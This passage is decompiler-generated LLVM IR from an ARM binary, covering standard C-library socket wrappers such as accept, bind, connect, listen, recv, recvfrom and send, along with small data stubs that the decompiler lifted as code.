  uselistorder label %dec_label_pc_137c0, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_137c8:
  %v0_137c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_137c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_137c8
  %v2_137cc = load i32, i32* @r4, align 4
  %v5_137cc = sdiv i32 %v2_137cc, 33554432
  %v6_137cc = and i32 %v5_137cc, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_137c8, %bb
  %v7_137cc = phi i32 [ %arg1, %dec_label_pc_137c8 ], [ %v6_137cc, %bb ]
  ret i32 %v7_137cc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_137d4 = load i32, i32* @r4, align 4
  %v9_137d4 = load i32, i32* @r6, align 4
  %v12_137d4 = load i32, i32* @r7, align 4
  %v4_137e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 13000) to i32*), align 4
  %v2_137e4 = icmp eq i32 %v4_137e0, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_137e4, label %dec_label_pc_137fc, label %entry.dec_label_pc_13808_crit_edge

entry.dec_label_pc_13808_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13808

dec_label_pc_137fc:                               ; preds = %entry
  store i32 %v3_137d4, i32* @r4, align 4
  store i32 %v9_137d4, i32* @r6, align 4
  store i32 %v12_137d4, i32* @r7, align 4
  %v0_13804 = call i32 @__sys_accept()
  br label %dec_label_pc_13808

dec_label_pc_13808:                               ; preds = %entry.dec_label_pc_13808_crit_edge, %dec_label_pc_137fc
  %v0_13808 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13808, i32* @r5, align 4
  %v0_13818 = load i32, i32* @r4, align 4
  store i32 %v0_13818, i32* @r0, align 4
  %v0_1381c = call i32 @__sys_accept()
  store i32 %v0_1381c, i32* @r4, align 4
  %v0_13824 = load i32, i32* @r5, align 4
  %v1_13828 = call i32 @__libc_disable_asynccancel(i32 %v0_13824)
  %v0_1382c = load i32, i32* @r4, align 4
  store i32 %v12_137d4, i32* @r7, align 4
  ret i32 %v0_1382c

; uselistorder directives
  uselistorder label %dec_label_pc_13808, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13844 = load i32, i32* @r7, align 4
  store i32 %v3_13844, i32* %stack_var_-8, align 4
  %v0_13850 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13850, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13850, -4095
  br i1 %tmp, label %dec_label_pc_13878, label %dec_label_pc_13860

dec_label_pc_13860:                               ; preds = %entry
  %v0_13864 = call i32 @__aeabi_read_tp()
  %v3_13868 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13868 = sext i16 %v3_13868 to i32
  %v0_1386c = load i32, i32* %r2.global-to-local, align 4
  %v1_1386c = sub i32 0, %v0_1386c
  store i32 %v1_1386c, i32* %r2.global-to-local, align 4
  %v3_13870 = add i32 %v4_13868, %v0_13864
  %v4_13870 = inttoptr i32 %v3_13870 to i32*
  store i32 %v1_1386c, i32* %v4_13870, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13878.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13878

dec_label_pc_13878:                               ; preds = %entry, %dec_label_pc_13860
  %v1_1387c = phi i32 [ %v0_13850, %entry ], [ -1, %dec_label_pc_13860 ]
  %v2_13878 = phi i32 [ %v3_13844, %entry ], [ %v2_13878.pre, %dec_label_pc_13860 ]
  store i32 %v2_13878, i32* @r7, align 4
  ret i32 %v1_1387c

; uselistorder directives
  uselistorder i32 %v0_13850, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13878, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13880:
  %v0_13880 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13880, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13880
  %v2_13884 = load i32, i32* @ip, align 4
  %v5_13884 = mul i32 %v2_13884, 16777216
  %v6_13884 = and i32 %v5_13884, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13880, %bb
  %v7_13884 = phi i32 [ %arg1, %dec_label_pc_13880 ], [ %v6_13884, %bb ]
  ret i32 %v7_13884

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13888 = load i32, i32* @r7, align 4
  store i32 %v3_13888, i32* %stack_var_-8, align 4
  %v0_13894 = load i32, i32* @r0, align 4
  store i32 %v0_13894, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13894, -4095
  br i1 %tmp, label %dec_label_pc_138bc, label %dec_label_pc_138a4

dec_label_pc_138a4:                               ; preds = %entry
  %v0_138a8 = call i32 @__aeabi_read_tp()
  %v3_138ac = load i16, i16* @global_var_2447c.761, align 2
  %v4_138ac = sext i16 %v3_138ac to i32
  store i32 %v4_138ac, i32* @r3, align 4
  %v0_138b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_138b0 = sub i32 0, %v0_138b0
  store i32 %v1_138b0, i32* %r2.global-to-local, align 4
  %v3_138b4 = add i32 %v4_138ac, %v0_138a8
  %v4_138b4 = inttoptr i32 %v3_138b4 to i32*
  store i32 %v1_138b0, i32* %v4_138b4, align 4
  %v2_138bc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_138bc

dec_label_pc_138bc:                               ; preds = %entry, %dec_label_pc_138a4
  %v1_138c0 = phi i32 [ %v0_13894, %entry ], [ -1, %dec_label_pc_138a4 ]
  %v2_138bc = phi i32 [ %v3_13888, %entry ], [ %v2_138bc.pre, %dec_label_pc_138a4 ]
  store i32 %v2_138bc, i32* @r7, align 4
  ret i32 %v1_138c0

; uselistorder directives
  uselistorder i32 %v0_13894, { 1, 0, 2 }
  uselistorder label %dec_label_pc_138bc, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_138c4:
  %v0_138c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_138c4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_138c4
  %v2_138c8 = load i32, i32* @r8, align 4
  %v5_138c8 = sdiv i32 %v2_138c8, 8388608
  %v6_138c8 = and i32 %v5_138c8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_138c4, %bb
  %v7_138c8 = phi i32 [ %arg1, %dec_label_pc_138c4 ], [ %v6_138c8, %bb ]
  ret i32 %v7_138c8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_138d0 = load i32, i32* @r4, align 4
  store i32 %v3_138d0, i32* %stack_var_-20, align 4
  %v6_138d0 = load i32, i32* @r5, align 4
  %v9_138d0 = load i32, i32* @r6, align 4
  %v12_138d0 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r3, align 4
  %v4_138dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 13000) to i32*), align 4
  store i32 %v4_138dc, i32* @ip, align 4
  %v2_138e0 = icmp eq i32 %v4_138dc, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_138e0, label %dec_label_pc_138f8, label %entry.dec_label_pc_13904_crit_edge

entry.dec_label_pc_13904_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13904

dec_label_pc_138f8:                               ; preds = %entry
  store i32 %v3_138d0, i32* @r4, align 4
  store i32 %v9_138d0, i32* @r6, align 4
  store i32 %v12_138d0, i32* @r7, align 4
  %v0_13900 = call i32 @__sys_connect()
  br label %dec_label_pc_13904

dec_label_pc_13904:                               ; preds = %entry.dec_label_pc_13904_crit_edge, %dec_label_pc_138f8
  %v0_13904 = call i32 @__libc_enable_asynccancel()
  %v0_13908 = load i32, i32* @r6, align 4
  store i32 %v0_13908, i32* @r1, align 4
  store i32 %v0_13904, i32* @r5, align 4
  %v0_13914 = load i32, i32* @r4, align 4
  store i32 %v0_13914, i32* @r0, align 4
  %v0_13918 = call i32 @__sys_connect()
  store i32 %v0_13918, i32* @r4, align 4
  %v0_13920 = load i32, i32* @r5, align 4
  %v1_13924 = call i32 @__libc_disable_asynccancel(i32 %v0_13920)
  %v0_13928 = load i32, i32* @r4, align 4
  %v2_13930 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13930, i32* @r4, align 4
  store i32 %v6_138d0, i32* @r5, align 4
  store i32 %v9_138d0, i32* @r6, align 4
  store i32 %v12_138d0, i32* @r7, align 4
  ret i32 %v0_13928

; uselistorder directives
  uselistorder label %dec_label_pc_13904, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13940 = load i32, i32* @r7, align 4
  store i32 %v3_13940, i32* %stack_var_-8, align 4
  %v0_1394c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1394c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1394c, -4095
  br i1 %tmp, label %dec_label_pc_13974, label %dec_label_pc_1395c

dec_label_pc_1395c:                               ; preds = %entry
  %v0_13960 = call i32 @__aeabi_read_tp()
  %v3_13964 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13964 = sext i16 %v3_13964 to i32
  %v0_13968 = load i32, i32* %r2.global-to-local, align 4
  %v1_13968 = sub i32 0, %v0_13968
  store i32 %v1_13968, i32* %r2.global-to-local, align 4
  %v3_1396c = add i32 %v4_13964, %v0_13960
  %v4_1396c = inttoptr i32 %v3_1396c to i32*
  store i32 %v1_13968, i32* %v4_1396c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13974.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13974

dec_label_pc_13974:                               ; preds = %entry, %dec_label_pc_1395c
  %v1_13978 = phi i32 [ %v0_1394c, %entry ], [ -1, %dec_label_pc_1395c ]
  %v2_13974 = phi i32 [ %v3_13940, %entry ], [ %v2_13974.pre, %dec_label_pc_1395c ]
  store i32 %v2_13974, i32* @r7, align 4
  ret i32 %v1_13978

; uselistorder directives
  uselistorder i32 %v0_1394c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13974, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1397c:
  %v0_1397c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1397c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1397c
  %v2_1397c = load i32, i32* @lr, align 4
  %v8_1397c = shl i32 %v2_1397c, %arg2
  %v9_1397c = and i32 %v8_1397c, %arg1
  %v3_13980 = load i32, i32* @fp, align 4
  %v8_13980 = shl i32 %v9_1397c, %v3_13980
  %v9_13980 = and i32 %v8_13980, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1397c, %bb
  %v10_13980 = phi i32 [ %arg1, %dec_label_pc_1397c ], [ %v9_13980, %bb ]
  ret i32 %v10_13980

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13984 = load i32, i32* @r4, align 4
  store i32 %v3_13984, i32* %stack_var_-12, align 4
  %v0_13994 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13994, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13994, -4095
  br i1 %tmp, label %dec_label_pc_139bc, label %dec_label_pc_139a4

dec_label_pc_139a4:                               ; preds = %entry
  %v0_139a8 = call i32 @__aeabi_read_tp()
  %v3_139ac = load i16, i16* @global_var_2447c.761, align 2
  %v4_139ac = sext i16 %v3_139ac to i32
  %v0_139b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_139b0 = sub i32 0, %v0_139b0
  store i32 %v1_139b0, i32* %r2.global-to-local, align 4
  %v3_139b4 = add i32 %v4_139ac, %v0_139a8
  %v4_139b4 = inttoptr i32 %v3_139b4 to i32*
  store i32 %v1_139b0, i32* %v4_139b4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_139bc.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_139bc

dec_label_pc_139bc:                               ; preds = %entry, %dec_label_pc_139a4
  %v1_139c0 = phi i32 [ %v0_13994, %entry ], [ -1, %dec_label_pc_139a4 ]
  %v2_139bc = phi i32 [ %v3_13984, %entry ], [ %v2_139bc.pre, %dec_label_pc_139a4 ]
  store i32 %v2_139bc, i32* @r4, align 4
  ret i32 %v1_139c0

; uselistorder directives
  uselistorder i32 %v0_13994, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_139bc, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_139c4:
  %v0_139c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_139c4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_139c4
  %v2_139c8 = load i32, i32* @r8, align 4
  %v5_139c8 = sdiv i32 %v2_139c8, 2097152
  %v6_139c8 = and i32 %v5_139c8, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_139c4, %bb
  %v7_139c8 = phi i32 [ %arg1, %dec_label_pc_139c4 ], [ %v6_139c8, %bb ]
  ret i32 %v7_139c8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_139cc = load i32, i32* @r7, align 4
  store i32 %v3_139cc, i32* %stack_var_-8, align 4
  %v0_139d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_139d8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_139d8, -4095
  br i1 %tmp, label %dec_label_pc_13a00, label %dec_label_pc_139e8

dec_label_pc_139e8:                               ; preds = %entry
  %v0_139ec = call i32 @__aeabi_read_tp()
  %v3_139f0 = load i16, i16* @global_var_2447c.761, align 2
  %v4_139f0 = sext i16 %v3_139f0 to i32
  %v0_139f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_139f4 = sub i32 0, %v0_139f4
  store i32 %v1_139f4, i32* %r2.global-to-local, align 4
  %v3_139f8 = add i32 %v4_139f0, %v0_139ec
  %v4_139f8 = inttoptr i32 %v3_139f8 to i32*
  store i32 %v1_139f4, i32* %v4_139f8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13a00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13a00

dec_label_pc_13a00:                               ; preds = %entry, %dec_label_pc_139e8
  %v1_13a04 = phi i32 [ %v0_139d8, %entry ], [ -1, %dec_label_pc_139e8 ]
  %v2_13a00 = phi i32 [ %v3_139cc, %entry ], [ %v2_13a00.pre, %dec_label_pc_139e8 ]
  store i32 %v2_13a00, i32* @r7, align 4
  ret i32 %v1_13a04

; uselistorder directives
  uselistorder i32 %v0_139d8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a00, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13a0c = load i32, i32* @r7, align 4
  store i32 %v3_13a0c, i32* %stack_var_-8, align 4
  %v0_13a18 = load i32, i32* @r0, align 4
  store i32 %v0_13a18, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13a18, -4095
  br i1 %tmp, label %dec_label_pc_13a40, label %dec_label_pc_13a28

dec_label_pc_13a28:                               ; preds = %entry
  %v0_13a2c = call i32 @__aeabi_read_tp()
  %v3_13a30 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13a30 = sext i16 %v3_13a30 to i32
  %v0_13a34 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a34 = sub i32 0, %v0_13a34
  store i32 %v1_13a34, i32* %r2.global-to-local, align 4
  %v3_13a38 = add i32 %v4_13a30, %v0_13a2c
  %v4_13a38 = inttoptr i32 %v3_13a38 to i32*
  store i32 %v1_13a34, i32* %v4_13a38, align 4
  %v2_13a40.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13a40

dec_label_pc_13a40:                               ; preds = %entry, %dec_label_pc_13a28
  %v1_13a44 = phi i32 [ %v0_13a18, %entry ], [ -1, %dec_label_pc_13a28 ]
  %v2_13a40 = phi i32 [ %v3_13a0c, %entry ], [ %v2_13a40.pre, %dec_label_pc_13a28 ]
  store i32 %v2_13a40, i32* @r7, align 4
  ret i32 %v1_13a44

; uselistorder directives
  uselistorder i32 %v0_13a18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13a40, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13a48:
  %v0_13a48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13a48, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13a48
  %v2_13a4c = load i32, i32* @r4, align 4
  %v5_13a4c = sdiv i32 %v2_13a4c, 1048576
  %v6_13a4c = and i32 %v5_13a4c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13a48, %bb
  %v7_13a4c = phi i32 [ %arg1, %dec_label_pc_13a48 ], [ %v6_13a4c, %bb ]
  ret i32 %v7_13a4c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13a54 = load i32, i32* @r4, align 4
  store i32 %v3_13a54, i32* %stack_var_-24, align 4
  %v6_13a54 = load i32, i32* @r5, align 4
  %v9_13a54 = load i32, i32* @r6, align 4
  %v12_13a54 = load i32, i32* @r7, align 4
  %v15_13a54 = load i32, i32* @r8, align 4
  %v18_13a54 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @ip, align 4
  %v4_13a60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 13000) to i32*), align 4
  %v2_13a64 = icmp eq i32 %v4_13a60, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_13a64, label %dec_label_pc_13a7c, label %entry.dec_label_pc_13a84_crit_edge

entry.dec_label_pc_13a84_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13a84

dec_label_pc_13a7c:                               ; preds = %entry
  store i32 %v3_13a54, i32* @r4, align 4
  store i32 %v9_13a54, i32* @r6, align 4
  store i32 %v12_13a54, i32* @r7, align 4
  store i32 %v15_13a54, i32* @r8, align 4
  %v0_13a80 = call i32 @__sys_recv()
  br label %dec_label_pc_13a84

dec_label_pc_13a84:                               ; preds = %entry.dec_label_pc_13a84_crit_edge, %dec_label_pc_13a7c
  %v0_13a84 = call i32 @__libc_enable_asynccancel()
  %v0_13a88 = load i32, i32* @r6, align 4
  store i32 %v0_13a88, i32* @r1, align 4
  store i32 %v0_13a84, i32* @r5, align 4
  %v0_13a98 = load i32, i32* @r4, align 4
  store i32 %v0_13a98, i32* @r0, align 4
  %v0_13a9c = call i32 @__sys_recv()
  store i32 %v0_13a9c, i32* @r4, align 4
  %v0_13aa4 = load i32, i32* @r5, align 4
  %v1_13aa8 = call i32 @__libc_disable_asynccancel(i32 %v0_13aa4)
  %v0_13aac = load i32, i32* @r4, align 4
  %v2_13ab0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13ab0, i32* @r4, align 4
  store i32 %v6_13a54, i32* @r5, align 4
  store i32 %v9_13a54, i32* @r6, align 4
  store i32 %v12_13a54, i32* @r7, align 4
  store i32 %v15_13a54, i32* @r8, align 4
  store i32 %v18_13a54, i32* @lr, align 4
  ret i32 %v0_13aac

; uselistorder directives
  uselistorder label %dec_label_pc_13a84, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13ac0 = load i32, i32* @r4, align 4
  store i32 %v3_13ac0, i32* %stack_var_-16, align 4
  %v0_13ad4 = load i32, i32* @r0, align 4
  store i32 %v0_13ad4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13ad4, -4095
  br i1 %tmp, label %dec_label_pc_13afc, label %dec_label_pc_13ae4

dec_label_pc_13ae4:                               ; preds = %entry
  %v0_13ae8 = call i32 @__aeabi_read_tp()
  %v3_13aec = load i16, i16* @global_var_2447c.761, align 2
  %v4_13aec = sext i16 %v3_13aec to i32
  %v0_13af0 = load i32, i32* %r2.global-to-local, align 4
  %v1_13af0 = sub i32 0, %v0_13af0
  store i32 %v1_13af0, i32* %r2.global-to-local, align 4
  %v3_13af4 = add i32 %v4_13aec, %v0_13ae8
  %v4_13af4 = inttoptr i32 %v3_13af4 to i32*
  store i32 %v1_13af0, i32* %v4_13af4, align 4
  %v2_13afc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_13afc

dec_label_pc_13afc:                               ; preds = %entry, %dec_label_pc_13ae4
  %v1_13b00 = phi i32 [ %v0_13ad4, %entry ], [ -1, %dec_label_pc_13ae4 ]
  %v2_13afc = phi i32 [ %v3_13ac0, %entry ], [ %v2_13afc.pre, %dec_label_pc_13ae4 ]
  store i32 %v2_13afc, i32* @r4, align 4
  ret i32 %v1_13b00

; uselistorder directives
  uselistorder i32 %v0_13ad4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13afc, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13b08 = load i32, i32* @r4, align 4
  store i32 %v3_13b08, i32* %stack_var_-32, align 4
  %v6_13b08 = load i32, i32* @r5, align 4
  %v9_13b08 = load i32, i32* @r6, align 4
  %v12_13b08 = load i32, i32* @r7, align 4
  %v15_13b08 = load i32, i32* @r8, align 4
  %v18_13b08 = load i32, i32* @sb, align 4
  %v21_13b08 = load i32, i32* @sl, align 4
  %v24_13b08 = load i32, i32* @lr, align 4
  %v4_13b18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 13000) to i32*), align 4
  %v2_13b20 = icmp eq i32 %v4_13b18, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_13b20, label %dec_label_pc_13b40, label %dec_label_pc_13b4c

dec_label_pc_13b40:                               ; preds = %entry
  store i32 %v3_13b08, i32* @r4, align 4
  store i32 %v12_13b08, i32* @r7, align 4
  store i32 %v15_13b08, i32* @r8, align 4
  store i32 %v18_13b08, i32* %sb.global-to-local, align 4
  %v0_13b48 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_13b4c

dec_label_pc_13b4c:                               ; preds = %entry, %dec_label_pc_13b40
  %v0_13b4c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13b4c, i32* @r5, align 4
  %v0_13b60 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_13b60, i32* @r0, align 4
  %v0_13b68 = call i32 @__sys_recvfrom()
  store i32 %v0_13b68, i32* @r4, align 4
  %v0_13b70 = load i32, i32* @r5, align 4
  %v1_13b74 = call i32 @__libc_disable_asynccancel(i32 %v0_13b70)
  %v0_13b78 = load i32, i32* @r4, align 4
  %v2_13b80 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_13b80, i32* @r4, align 4
  store i32 %v6_13b08, i32* @r5, align 4
  store i32 %v9_13b08, i32* @r6, align 4
  store i32 %v12_13b08, i32* @r7, align 4
  store i32 %v15_13b08, i32* @r8, align 4
  store i32 %v18_13b08, i32* @sb, align 4
  store i32 %v21_13b08, i32* @sl, align 4
  store i32 %v24_13b08, i32* @lr, align 4
  ret i32 %v0_13b78

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b4c, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13b90 = load i32, i32* @r7, align 4
  store i32 %v3_13b90, i32* %stack_var_-8, align 4
  %v0_13b9c = load i32, i32* @r0, align 4
  store i32 %v0_13b9c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13b9c, -4095
  br i1 %tmp, label %dec_label_pc_13bc4, label %dec_label_pc_13bac

dec_label_pc_13bac:                               ; preds = %entry
  %v0_13bb0 = call i32 @__aeabi_read_tp()
  %v3_13bb4 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13bb4 = sext i16 %v3_13bb4 to i32
  store i32 %v4_13bb4, i32* @r3, align 4
  %v0_13bb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13bb8 = sub i32 0, %v0_13bb8
  store i32 %v1_13bb8, i32* %r2.global-to-local, align 4
  %v3_13bbc = add i32 %v4_13bb4, %v0_13bb0
  %v4_13bbc = inttoptr i32 %v3_13bbc to i32*
  store i32 %v1_13bb8, i32* %v4_13bbc, align 4
  %v2_13bc4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13bc4

dec_label_pc_13bc4:                               ; preds = %entry, %dec_label_pc_13bac
  %v1_13bc8 = phi i32 [ %v0_13b9c, %entry ], [ -1, %dec_label_pc_13bac ]
  %v2_13bc4 = phi i32 [ %v3_13b90, %entry ], [ %v2_13bc4.pre, %dec_label_pc_13bac ]
  store i32 %v2_13bc4, i32* @r7, align 4
  ret i32 %v1_13bc8

; uselistorder directives
  uselistorder i32 %v0_13b9c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13bc4, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13bcc:
  %v0_13bcc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13bcc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13bcc
  %v5_13bcc = udiv i32 %arg2, 4
  %v6_13bcc = and i32 %v5_13bcc, %arg1
  %v5_13bd02 = udiv i32 %v6_13bcc, 131072
  %v6_13bd0 = and i32 %v5_13bd02, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13bcc, %bb
  %v7_13bd0 = phi i32 [ %arg1, %dec_label_pc_13bcc ], [ %v6_13bd0, %bb ]
  ret i32 %v7_13bd0

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13bd8 = load i32, i32* @r4, align 4
  store i32 %v3_13bd8, i32* %stack_var_-24, align 4
  %v6_13bd8 = load i32, i32* @r5, align 4
  %v9_13bd8 = load i32, i32* @r6, align 4
  %v12_13bd8 = load i32, i32* @r7, align 4
  %v15_13bd8 = load i32, i32* @r8, align 4
  %v18_13bd8 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @ip, align 4
  %v4_13be4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 13000) to i32*), align 4
  %v2_13be8 = icmp eq i32 %v4_13be4, 0
